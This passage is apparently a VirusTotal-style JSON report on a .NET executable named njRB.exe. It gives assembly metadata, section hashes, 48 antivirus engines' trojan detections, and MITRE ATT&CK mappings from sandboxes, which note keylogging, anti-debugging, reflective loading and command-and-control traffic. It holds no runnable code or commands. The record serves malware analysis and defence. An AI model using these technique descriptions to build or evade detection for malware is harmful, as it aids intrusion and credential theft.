              "DataGridViewRowCollection",
              "MouseButtons",
              "DataGridViewHitTestType",
              "DataGridViewBand",
              "ToolStripDropDown",
              "DataGridViewElementStates",
              "DockStyle",
              "Padding",
              "ButtonBase",
              "DataGridViewColumnHeadersHeightSizeMode",
              "DataGridViewColumnCollection",
              "DataGridViewColumn",
              "MouseEventHandler",
              "DataGridViewAutoSizeColumnMode",
              "ToolStrip",
              "ToolStripItemCollection",
              "ToolStripItem",
              "ContainerControl",
              "AutoScaleMode",
              "DataGridViewCellCollection",
              "DataGridViewCell",
              "TextBoxBase",
              "PictureBoxSizeMode",
              "BorderStyle",
              "FormBorderStyle",
              "Application"
            ],
            "namespace": "System.Windows.Forms"
          },
          {
            "type_definitions": [
              "GeneratedCodeAttribute"
            ],
            "namespace": "System.CodeDom.Compiler"
          },
          {
            "type_definitions": [
              "ResourceManager"
            ],
            "namespace": "System.Resources"
          },
          {
            "type_definitions": [
              "Thread"
            ],
            "namespace": "System.Threading"
          },
          {
            "type_definitions": [
              "MD5",
              "HashAlgorithm"
            ],
            "namespace": "System.Security.Cryptography"
          },
          {
            "type_definitions": [
              "CultureInfo"
            ],
            "namespace": "System.Globalization"
          },
          {
            "type_definitions": [
              "DebuggingModes",
              "HitTestInfo",
              "ControlCollection"
            ],
            "namespace": "uncategorized"
          }
        ],
        "entry_point_rva": 31480,
        "tables_rows_map": "16ec04302f0230b2017001014000206700101001004000031010",
        "assembly_flags_txt": "COMIMAGE_FLAGS_ILONLY, COMIMAGE_FLAGS_32BITREQUIRED",
        "assembly_name": "njRB.exe",
        "streams": {
          "#GUID": {
            "chi2": 272,
            "md5": "f71de89dee9465cf09bdc9ca70ad48b1",
            "entropy": 3.875,
            "size": 16
          },
          "#Blob": {
            "chi2": 10862.8935546875,
            "md5": "fec2dba7db3d75e20135422f6ade6ced",
            "entropy": 5.5928521156311035,
            "size": 1356
          },
          "#US": {
            "chi2": 155049.828125,
            "md5": "eb1bf145490ec4c4878ddff7f7ed53c6",
            "entropy": 3.732037305831909,
            "size": 2396
          },
          "#~": {
            "chi2": 94802.28125,
            "md5": "c6e9b22b61640b0c465081354b06e3be",
            "entropy": 5.348573684692383,
            "size": 3708
          },
          "#Strings": {
            "chi2": 52309.5546875,
            "md5": "5cfb1f73486f3d1f416ec72cf1945d39",
            "entropy": 4.902650356292725,
            "size": 4608
          }
        },
        "tables_present": 20,
        "clr_version": "v4.0.30319",
        "assembly_data": {
          "majorversion": 2,
          "minorversion": 0,
          "hashalgid": 32772,
          "flags_text": "afPA_None",
          "buildnumber": 2,
          "flags": 0,
          "revisionnumber": 20,
          "name": "njRB"
        },
        "clr_meta_version": "1.1",
        "tables_present_map": "b0929a29557",
        "resources_va": 840552
      },
      "pe_info": {
        "resource_details": [
          {
            "lang": "NEUTRAL",
            "entropy": 3.3287246227264404,
            "chi2": 68358.43,
            "filetype": "unknown",
            "sha256": "ba3f107a76931a762abf940f4c08a42f16ea1ac15b9aa082a1c8de697c77d435",
            "type": "RT_VERSION"
          }
        ],
        "resource_types": {
          "RT_VERSION": 1
        },
        "imphash": "f34d5f2d4577ed6d9ceec516c1f5a744",
        "resource_langs": {
          "NEUTRAL": 1
        },
        "machine_type": 332,
        "timestamp": 1705541551,
        "entry_point": 877042,
        "sections": [
          {
            "name": ".text",
            "chi2": 33393.99,
            "virtual_address": 8192,
            "entropy": 7.98,
            "raw_size": 869376,
            "flags": "rx",
            "virtual_size": 868880,
            "md5": "3d179966b2257dc1b0c0fe01d207aa73"
          },
          {
            "name": ".rsrc",
            "chi2": 106969.5,
            "virtual_address": 884736,
            "entropy": 2.93,
            "raw_size": 1024,
            "flags": "r",
            "virtual_size": 916,
            "md5": "6a3566ff216fd137263eaec82c3e1674"
          },
          {
            "name": ".reloc",
            "chi2": 128015,
            "virtual_address": 892928,
            "entropy": 0.1,
            "raw_size": 512,
            "flags": "r",
            "virtual_size": 12,
            "md5": "8a399eae0b703613aa4e738f60b47b2e"
          }
        ],
        "import_list": [
          {
            "library_name": "mscoree.dll",
            "imported_functions": [
              "_CorExeMain"
            ]
          }
        ]
      },
      "magic": "PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 4,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 48,
        "undetected": 21
      },
      "last_analysis_results": {
        "Bkav": {
          "category": "malicious",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": "W32.AIDetectMalware.CS",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Lionic": {
          "category": "malicious",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": "Trojan.Win32.Taskun.4!c",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Elastic": {
          "category": "malicious",
          "engine_name": "Elastic",
          "engine_version": "4.0.125",
          "result": "malicious (high confidence)",
          "method": "blacklist",
          "engine_update": "20240115"
        },
        "MicroWorld-eScan": {
          "category": "malicious",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": "Trojan.GenericKD.71260397",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240106"
        },
        "CAT-QuickHeal": {
          "category": "malicious",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": "Trojan.YakbeexMSIL.ZZ4",
          "method": "blacklist",
          "engine_update": "20240118"
        },
        "Skyhigh": {
          "category": "malicious",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "result": "BehavesLike.Win32.Generic.cc",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "McAfee": {
          "category": "malicious",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": "Artemis!5214925401A3",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Cylance": {
          "category": "malicious",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": "unsafe",
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Zillya": {
          "category": "undetected",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.5037",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Sangfor": {
          "category": "malicious",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": "Trojan.Msil.Taskun.Vr5i",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "CrowdStrike": {
          "category": "malicious",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": "win/malicious_confidence_100% (W)",
          "method": "blacklist",
          "engine_update": "20231026"
        },
        "Alibaba": {
          "category": "undetected",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "malicious",
          "engine_name": "K7GW",
          "engine_version": "12.137.50792",
          "result": "Trojan ( 005b0aab1 )",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "K7AntiVirus": {
          "category": "malicious",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.137.50790",
          "result": "Trojan ( 005b0aab1 )",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Arcabit": {
          "category": "malicious",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": "Trojan.Generic.D43F58ED",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "VirIT": {
          "category": "malicious",
          "engine_name": "VirIT",
          "engine_version": "9.5.622",
          "result": "Trojan.Win32.MSIL_Heur.A",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.21.0.0",
          "result": "Scr.Malcode!gdn33",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "tehtris": {
          "category": "undetected",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4-109-g76614fd",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "ESET-NOD32": {
          "category": "malicious",
          "engine_name": "ESET-NOD32",
          "engine_version": "28597",
          "result": "a variant of MSIL/Kryptik.AKQK",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Cynet": {
          "category": "malicious",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.28",
          "result": "Malicious (score: 100)",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "APEX": {
          "category": "malicious",
          "engine_name": "APEX",
          "engine_version": "6.491",
          "result": "Malicious",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Paloalto": {
          "category": "undetected",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "ClamAV": {
          "category": "malicious",
          "engine_name": "ClamAV",
          "engine_version": "1.2.1.0",
          "result": "Win.Packed.Filerepmalware-10019156-0",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": "HEUR:Trojan.MSIL.Taskun.gen",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "BitDefender": {
          "category": "malicious",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": "Trojan.GenericKD.71260397",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "NANO-Antivirus": {
          "category": "undetected",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "result": "Win32:TrojanX-gen [Trj]",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Tencent": {
          "category": "malicious",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": "Msil.Trojan.Taskun.Xdkl",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Emsisoft": {
          "category": "malicious",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": "Trojan.GenericKD.71260397 (B)",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "F-Secure": {
          "category": "malicious",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "result": "Trojan.TR/Kryptik.kukau",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "DrWeb": {
          "category": "malicious",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": "Trojan.PackedNET.2511",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "VIPRE": {
          "category": "malicious",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": "Trojan.GenericKD.71260397",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "TrendMicro": {
          "category": "undetected",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Sophos": {
          "category": "malicious",
          "engine_name": "Sophos",
          "engine_version": "2.4.3.0",
          "result": "Troj/Krypt-ABH",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "result": "Trojan.MSIL.Crypt",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "240119-02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Webroot": {
          "category": "malicious",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": "W32.Trojan.Gen",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Varist": {
          "category": "malicious",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "result": "W32/MSIL_Troj.CZY.gen!Eldorado",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Avira": {
          "category": "malicious",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": "TR/Kryptik.kukau",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Antiy-AVL": {
          "category": "malicious",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": "Trojan/MSIL.Kryptik",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Kingsoft": {
          "category": "malicious",
          "engine_name": "Kingsoft",
          "engine_version": "None",
          "result": "MSIL.Trojan.Taskun.gen",
          "method": "blacklist",
          "engine_update": "20230906"
        },
        "Gridinsoft": {
          "category": "undetected",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.155.174",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Xcitium": {
          "category": "undetected",
          "engine_name": "Xcitium",
          "engine_version": "36360",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Microsoft": {
          "category": "malicious",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23110.2",
          "result": "Trojan:MSIL/Taskun.ARAQ!MTB",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "ZoneAlarm": {
          "category": "malicious",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": "HEUR:Trojan.MSIL.Taskun.gen",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.37197B:27.34623",
          "result": "Trojan.GenericKD.71260397",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Google": {
          "category": "malicious",
          "engine_name": "Google",
          "engine_version": "1705689022",
          "result": "Detected",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "AhnLab-V3": {
          "category": "malicious",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.25.0.10459",
          "result": "Trojan/Win.Injection.C5576376",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "ALYac": {
          "category": "undetected",
          "engine_name": "ALYac",
          "engine_version": "2.0.0.8",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2024-01-19.02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Malwarebytes": {
          "category": "malicious",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": "Trojan.MalPack.PNG.Generic",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Panda": {
          "category": "malicious",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": "Trj/GdSda.A",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "TrendMicro-HouseCall": {
          "category": "malicious",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": "TROJ_GEN.R002H07AI24",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Rising": {
          "category": "malicious",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": "Malware.Obfus/MSIL@AI.100 (RDM.MSIL2:xbuM3+vFlimqnzzNg7Essg)",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "SentinelOne": {
          "category": "malicious",
          "engine_name": "SentinelOne",
          "engine_version": "23.4.2.3",
          "result": "Static AI - Malicious PE",
          "method": "blacklist",
          "engine_update": "20231119"
        },
        "MaxSecure": {
          "category": "malicious",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": "Trojan.Malware.300983.susgen",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": "MSIL/Nekark.TIYVL!tr",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "result": "Win32:TrojanX-gen [Trj]",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Cybereason": {
          "category": "undetected",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231102"
        },
        "DeepInstinct": {
          "category": "malicious",
          "engine_name": "DeepInstinct",
          "engine_version": "5.0.0.8",
          "result": "MALICIOUS",
          "method": "blacklist",
          "engine_update": "20240116"
        }
      },
      "reputation": -2
    },
    "type": "file",
    "id": "8e436dc374b71fcb5168d9bba73804267770466a94f4ac20785009c8799bc803",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/8e436dc374b71fcb5168d9bba73804267770466a94f4ac20785009c8799bc803"
    }
  },
  "mitre": {
    "data": {
      "CAPE Sandbox": {
        "tactics": [
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\nNative API functions (such as NtCreateProcess) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API CreateProcess() or GNU fork() will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks. Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via Disable or Modify Tools.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may interact with the native OS application programming interface (API) to execute behaviors."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1106/",
                "id": "T1106",
                "name": "Native API"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
            "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.",
            "techniques": [
              {
                "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1071/",
                "id": "T1071",
                "name": "Application Layer Protocol"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0011/",
            "id": "TA0011",
            "name": "Command and Control"
          }
        ]
      },
      "Yomi Hunter": {
        "tactics": [
          {
            "description": "The adversary is trying to gather data of interest to their goal.\n\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to steal (exfiltrate) the data. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.",
            "techniques": [
              {
                "description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "The process behaves as a keylogger (keyboard capturing detected)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1056/",
                "id": "T1056",
                "name": "Input Capture"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0009/",
            "id": "TA0009",
            "name": "Collection"
          },
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., Native API).\nAdversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.\nThe Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in dlfcn.h in functions such as dlopen and dlsym. Although macOS can execute .so files, common practice uses .dylib files.\nThe Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like LoadLibrary at run time.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "SetUnhandledExceptionFilter detected: superseding the top-level exception handler of each thread of a process is a common anti-debug technique."
                  },
                  {
                    "severity": "UNKNOWN",
                    "description": "The process attempted to dynamically load a malicious function"
                  },
                  {
                    "severity": "UNKNOWN",
                    "description": "The process tried to load dynamically one or more functions."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1129/",
                "id": "T1129",
                "name": "Shared Modules"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. dir, show flash, and/or nvram).",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "SetUnhandledExceptionFilter detected: superseding the top-level exception handler of each thread of a process is a common anti-debug technique."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1083/",
                "id": "T1083",
                "name": "File and Directory Discovery"
              },
              {
                "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.\nOn network devices, Network Device CLI commands such as show processes can be used to display current running processes.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "The process has tried to detect the debugger probing the use of page guards."
                  },
                  {
                    "severity": "UNKNOWN",
                    "description": "The process attempted to detect a running debugger using common APIs"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1057/",
                "id": "T1057",
                "name": "Process Discovery"
              },
              {
                "description": "Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. show ip route, show ip interface).\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. ",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "The process has tried to get the host's public IP address"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1016/",
                "id": "T1016",
                "name": "System Network Configuration Discovery"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.",
            "techniques": [
              {
                "description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "The process behaves as a keylogger (keyboard capturing detected)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1056/",
                "id": "T1056",
                "name": "Input Capture"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0006/",
            "id": "TA0006",
            "name": "Credential Access"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk. Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).\nReflective code injection is very similar to Process Injection except that the “injection” loads code into the processes’ own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "SetUnhandledExceptionFilter detected: superseding the top-level exception handler of each thread of a process is a common anti-debug technique."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1620/",
                "id": "T1620",
                "name": "Reflective Code Loading"
              },
              {
                "description": "Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows copy /b command to reassemble binary fragments into a malicious payload.\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. ",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "SetUnhandledExceptionFilter detected: superseding the top-level exception handler of each thread of a process is a common anti-debug technique."
                  },
                  {
